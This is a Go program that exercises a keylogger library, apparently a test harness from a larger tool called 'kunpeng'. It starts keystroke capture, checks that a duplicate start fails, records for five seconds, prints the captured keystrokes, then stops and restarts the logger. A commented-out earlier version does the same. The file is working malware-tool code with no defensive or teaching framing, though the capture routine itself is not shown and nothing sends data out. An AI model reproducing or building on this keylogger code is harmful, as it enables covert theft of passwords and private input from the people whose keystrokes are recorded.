package main

import (
	"kunpeng/keylogger"
	"time"
)

//
//func main() {
//
//	kellogg := &keylogger.KeyLoggerInfo{}
//	kellogg.KeyLoggerOver = false
//	go keylogger.RunKeyLogger(kellogg)
//	time.Sleep(5000 * time.Millisecond)
//	kellogg.KeyLoggerOver = true
//	print(kellogg.Recording)
//	var input string
//	fmt.Scanln(&input)
//}
func main() {

	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}
	time.Sleep(5000 * time.Millisecond)

	print(keylogger.GetKeyRecording())
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}

}
